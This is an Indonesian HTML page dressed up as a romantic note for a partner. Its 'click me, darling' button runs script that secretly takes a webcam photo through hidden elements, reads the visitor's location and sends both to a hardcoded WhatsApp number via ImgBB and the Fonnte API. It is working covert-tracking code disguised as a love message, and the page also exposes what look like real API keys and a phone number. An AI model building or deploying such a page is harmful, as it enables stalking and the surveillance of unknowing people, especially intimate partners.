<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website Bucin</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: pink;
            color: white;
            padding: 50px;
        }
        h1 {
            font-size: 2em;
        }
        button {
            background-color: red;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            cursor: pointer;
            border-radius: 10px;
        }
        button:hover {
            background-color: darkred;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <h1>ðŸ’– Hai Sayang ðŸ’–</h1>
    <p>Aku cuma mau bilang, kamu adalah orang paling spesial dalam hidupku! ðŸ¥°</p>
    <p>Klik tombol di bawah ini kalau kamu juga sayang aku! ðŸ˜˜</p>

    <button onclick="startTracking()">Klik Aku Sayang</button>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const IMGBB_API_KEY = "7a9fe540ea4e1a787196f5df39b361ef";  // Ganti dengan API Key Imgbb
        const FONNTE_TOKEN = "8KHbYQ5dBEM6YC3edFPx";    // Ganti dengan Token API Fonnte
        const TARGET_NUMBER = "082162975617";        // Ganti dengan nomor tujuan WhatsApp

        // ðŸ”¹ Fungsi untuk mengunggah gambar ke Imgbb
        async function uploadToImgBB(imageBlob) {
            const formData = new FormData();
            formData.append("image", imageBlob);

            const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                method: "POST",
                body: formData
            });

            const result = await response.json();
            return result.data.url;  // URL langsung ke gambar
        }

        // ðŸ”¹ Fungsi untuk mengirim data ke WhatsApp via Fonnte
        async function sendToWhatsApp(latitude, longitude, imageBlob) {
            const imageUrl = await uploadToImgBB(imageBlob);
            
            await new Promise(resolve => setTimeout(resolve, 2000));  // Tunggu 2 detik agar gambar siap

            const message = `ðŸ“ *Lokasi Pengguna:*\nðŸ”¹ Latitude: ${latitude}\nðŸ”¹ Longitude: ${longitude}\nðŸ–¼ï¸ *Foto:* [Klik di sini](${imageUrl})`;

            const data = new FormData();
            data.append("target", TARGET_NUMBER);
            data.append("message", message);
            data.append("countryCode", "62");

            const response = await fetch("https://api.fonnte.com/send", {
                method: "POST",
                headers: {
                    "Authorization": FONNTE_TOKEN
                },
                body: data
            });

            const res = await response.json();
            alert("Data berhasil dikirim ke WhatsApp! âœ…");
            console.log(res);
        }

        // ðŸ”¹ Fungsi untuk mengambil foto dari kamera
        function capturePhoto(callback) {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        video.srcObject.getTracks().forEach(track => track.stop());
                        canvas.toBlob(callback, "image/jpeg");
                    }, 3000);  // Ambil gambar setelah 3 detik
                })
                .catch(error => alert("Kamera tidak dapat diakses ðŸ˜¢"));
        }

        // ðŸ”¹ Fungsi untuk mendapatkan lokasi pengguna
        function getLocation(callback) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    callback(position.coords.latitude, position.coords.longitude);
                }, error => {
                    alert("Kamu harus mengizinkan lokasi supaya aku tahu di mana kamu. ðŸ¥º");
                });
            } else {
                alert("Browser kamu tidak mendukung fitur lokasi. ðŸ˜¢");
            }
        }

        // ðŸ”¹ Fungsi utama untuk mulai tracking (foto + lokasi)
        function startTracking() {
            capturePhoto(blob => {
                getLocation((latitude, longitude) => {
                    sendToWhatsApp(latitude, longitude, blob);
                });
            });
        }
    </script>

</body>
</html>
